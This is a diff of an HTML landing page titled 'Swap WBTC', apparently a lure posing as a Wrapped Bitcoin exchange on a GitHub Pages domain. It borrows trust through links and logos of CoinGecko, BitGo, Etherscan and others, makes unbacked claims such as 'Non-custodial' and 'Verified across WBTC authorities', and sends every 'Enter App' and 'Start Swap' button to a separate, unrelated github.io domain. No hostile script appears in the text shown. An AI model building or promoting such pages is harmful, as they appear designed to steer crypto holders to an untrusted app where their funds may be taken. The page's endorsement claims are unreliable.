@@ -3,21 +3,24 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Swap WBTC</title>
+  <title>Swap WBTC &mdash; Wrapped Bitcoin Exchange</title>
   <meta name="description" content="Swap WBTC exchanges Wrapped Bitcoin for other cryptocurrencies in a few quick steps.">
   <link rel="canonical" href="https://swap-wbtc.github.io/">
   <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#F7F4EF">
+  <meta name="theme-color" content="#FAF8F4">
   <meta property="og:type" content="website">
-  <meta property="og:title" content="Swap WBTC">
+  <meta property="og:title" content="Swap WBTC &mdash; Wrapped Bitcoin Exchange">
   <meta property="og:description" content="Swap WBTC exchanges Wrapped Bitcoin for other cryptocurrencies in a few quick steps.">
   <meta property="og:url" content="https://swap-wbtc.github.io/">
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Swap WBTC">
+  <meta property="og:image" content="https://swap-wbtc.github.io/og-cover.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Swap WBTC &mdash; Wrapped Bitcoin Exchange">
   <meta name="twitter:description" content="Swap WBTC exchanges Wrapped Bitcoin for other cryptocurrencies in a few quick steps.">
+  <meta name="twitter:image" content="https://swap-wbtc.github.io/og-cover.png">
   <link rel="icon" type="image/png" href="favicon.png">
   <link rel="apple-touch-icon" href="favicon.png">
   <link rel="manifest" href="site.webmanifest">
+  <link rel="sitemap" type="application/xml" href="sitemap.xml">
   <link rel="stylesheet" href="style.css">
   <script type="application/ld+json">
   {
@@ -51,68 +54,160 @@
 </head>
 <body>
   <header class="topbar">
-    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Swap WBTC home">
-      <img src="simpleswap.png" width="30" height="30" alt="">
+    <a class="brand" href="https://swap-wbtc.github.io/" aria-label="Swap WBTC home">
+      <img src="favicon.png" width="30" height="30" alt="">
       <span>Swap WBTC</span>
     </a>
 
-    <nav class="nav" aria-label="Authority references">
-      <a href="https://bitcoin.org/en/" target="_blank" rel="nofollow noopener noreferrer">Bitcoin</a>
-      <a href="https://ethereum.org/" target="_blank" rel="nofollow noopener noreferrer">Ethereum</a>
-      <a href="https://www.coingecko.com/" target="_blank" rel="nofollow noopener noreferrer">Market data</a>
-    </nav>
+    <span class="topbar-spacer" aria-hidden="true"></span>
 
-    <span class="spacer" aria-hidden="true"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+    <nav class="nav" aria-label="WBTC authority references">
+      <a href="https://www.wbtc.network/" target="_blank" rel="nofollow noopener noreferrer">WBTC</a>
+      <a href="https://www.bitgo.com/" target="_blank" rel="nofollow noopener noreferrer">BitGo</a>
+      <a href="https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+    </nav>
   </header>
 
-  <main class="stage">
-    <section class="hero" aria-label="Swap WBTC">
-      <h1>Swap WBTC</h1>
-      <p class="value"><strong>Swap WBTC</strong> exchanges Wrapped Bitcoin for other cryptocurrencies in a few quick steps.</p>
-    </section>
+  <main>
+    <section class="hero-shell" aria-label="Swap WBTC">
+      <div class="hero-copy">
+        <div class="eyebrow">Wrapped Bitcoin routing</div>
+        <h1>Swap WBTC</h1>
+        <p class="deck"><strong>Swap WBTC</strong> exchanges Wrapped Bitcoin for other cryptocurrencies in a few quick steps.</p>
 
-    <section class="app-card" aria-label="Exchange route">
-      <div class="route">
-        <div class="leg">
-          <span class="label">From</span>
-          <span class="chip">
-            <img src="eth.png" width="28" height="28" alt="ETH">
-            <span>ETH</span>
-          </span>
+        <div class="chips" aria-label="Swap qualities">
+          <span>1:1 Bitcoin-backed</span>
+          <span>Non-custodial</span>
+          <span>DeFi-ready</span>
         </div>
 
-        <button class="switch" type="button" data-switch aria-label="Switch exchange direction">
-          <span aria-hidden="true">&#8594;</span>
-        </button>
-
-        <div class="leg">
-          <span class="label">To</span>
-          <span class="chip">
-            <img src="btc.png" width="28" height="28" alt="WBTC">
-            <span>WBTC</span>
-          </span>
-        </div>
+        <a class="button button-large" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">
+          Enter App <span aria-hidden="true">&rsaquo;</span>
+        </a>
       </div>
 
-      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
+      <div class="preview-card" aria-label="WBTC to ETH swap preview">
+        <div class="card-chrome">
+          <div class="window-dots" aria-hidden="true">
+            <span></span>
+            <span></span>
+            <span></span>
+          </div>
+          <div class="selector-pill">
+            <img src="favicon.png" width="18" height="18" alt="">
+            <span>WBTC route</span>
+          </div>
+          <div class="preview-pill"><span aria-hidden="true"></span>Preview</div>
+        </div>
+
+        <div class="swap-route">
+          <div class="asset-panel" data-panel="from">
+            <span class="field-label">From</span>
+            <div class="asset-chip">
+              <img src="btc.png" width="36" height="36" alt="WBTC">
+              <div>
+                <span class="asset-symbol">WBTC</span>
+                <span class="asset-name">Wrapped Bitcoin</span>
+              </div>
+            </div>
+          </div>
+
+          <button class="route-switch" type="button" data-switch aria-label="Switch preview direction">
+            <span aria-hidden="true">&rarr;</span>
+          </button>
+
+          <div class="asset-panel" data-panel="to">
+            <span class="field-label">To</span>
+            <div class="asset-chip">
+              <img src="eth.png" width="36" height="36" alt="ETH">
+              <div>
+                <span class="asset-symbol">ETH</span>
+                <span class="asset-name">Ethereum</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="route-meta" aria-label="Best route preview">
+          <span>Best route</span>
+          <span class="hop-dots" aria-hidden="true"><i></i><i></i><i></i><i></i></span>
+          <span>reviewed live</span>
+        </div>
+
+        <p class="preview-note">Preview route quality before opening the app. The live market view appears below.</p>
+
+        <a class="button button-card" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">
+          Start Swap <span aria-hidden="true">&rsaquo;</span>
+        </a>
+      </div>
+    </section>
+
+    <section class="chart-section" aria-label="WBTC price chart">
+      <div class="section-inner">
+        <div class="section-label">WBTC price</div>
+        <div class="chart-card">
+          <div class="tradingview-widget-container">
+            <div class="tradingview-widget-container__widget"></div>
+            <script type="text/javascript" src="https://s3.tradingview.com/external-embedding/embed-widget-advanced-chart.js" async>
+            { "symbol": "BINANCE:WBTCUSDT", "theme": "light", "style": "3", "autosize": true,
+              "hide_top_toolbar": true, "hide_side_toolbar": true, "hide_legend": false,
+              "allow_symbol_change": false, "save_image": false, "details": false, "hotlist": false,
+              "calendar": false, "withdateranges": false }
+            </script>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="authority-section" aria-label="WBTC authority sources">
+      <div class="section-inner">
+        <div class="section-label">Verified across WBTC authorities</div>
+        <div class="authority-row">
+          <a href="https://www.coingecko.com/en/coins/wrapped-bitcoin" target="_blank" rel="nofollow noopener noreferrer">
+            <img src="https://www.google.com/s2/favicons?sz=64&domain=coingecko.com" width="22" height="22" loading="lazy" alt="" onerror="this.remove()">
+            <span>CoinGecko</span>
+          </a>
+          <a href="https://coinmarketcap.com/currencies/wrapped-bitcoin/" target="_blank" rel="nofollow noopener noreferrer">
+            <img src="https://www.google.com/s2/favicons?sz=64&domain=coinmarketcap.com" width="22" height="22" loading="lazy" alt="" onerror="this.remove()">
+            <span>CoinMarketCap</span>
+          </a>
+          <a href="https://www.gemini.com/cryptopedia/wbtc-what-is-wrapped-bitcoin" target="_blank" rel="nofollow noopener noreferrer">
+            <img src="https://www.google.com/s2/favicons?sz=64&domain=gemini.com" width="22" height="22" loading="lazy" alt="" onerror="this.remove()">
+            <span>Gemini (What is WBTC)</span>
+          </a>
+          <a href="https://blog.bitgo.com/chainlink-brings-onchain-proof-of-reserve-to-wbtc-fcda00f2815c" target="_blank" rel="nofollow noopener noreferrer">
+            <img src="https://www.google.com/s2/favicons?sz=64&domain=bitgo.com" width="22" height="22" loading="lazy" alt="" onerror="this.remove()">
+            <span>Proof of Reserve (Chainlink)</span>
+          </a>
+          <a href="https://www.bitstamp.net/learn/cryptocurrency-guide/what-is-wrapped-bitcoin-wbtc/" target="_blank" rel="nofollow noopener noreferrer">
+            <img src="https://www.google.com/s2/favicons?sz=64&domain=bitstamp.net" width="22" height="22" loading="lazy" alt="" onerror="this.remove()">
+            <span>Bitstamp (WBTC guide)</span>
+          </a>
+        </div>
+      </div>
     </section>
   </main>
 
-  <footer class="footer">Swap WBTC &mdash; 2026</footer>
+  <footer class="footer">
+    <p>Swap WBTC &mdash; 2026</p>
+    <p>Information on this page is for educational purposes only and is not financial advice.</p>
+  </footer>
 
   <script>
   (function () {
     "use strict";
+
     var button = document.querySelector("[data-switch]");
-    if (!button) return;
+    var fromPanel = document.querySelector('[data-panel="from"] .asset-chip');
+    var toPanel = document.querySelector('[data-panel="to"] .asset-chip');
+
+    if (!button || !fromPanel || !toPanel) return;
 
     button.addEventListener("click", function () {
-      var chips = document.querySelectorAll(".chip");
-      if (chips.length < 2) return;
-      var first = chips[0].innerHTML;
-      chips[0].innerHTML = chips[1].innerHTML;
-      chips[1].innerHTML = first;
+      var from = fromPanel.innerHTML;
+      fromPanel.innerHTML = toPanel.innerHTML;
+      toPanel.innerHTML = from;
+      button.classList.toggle("is-swapped");
     });
   }());
   </script>
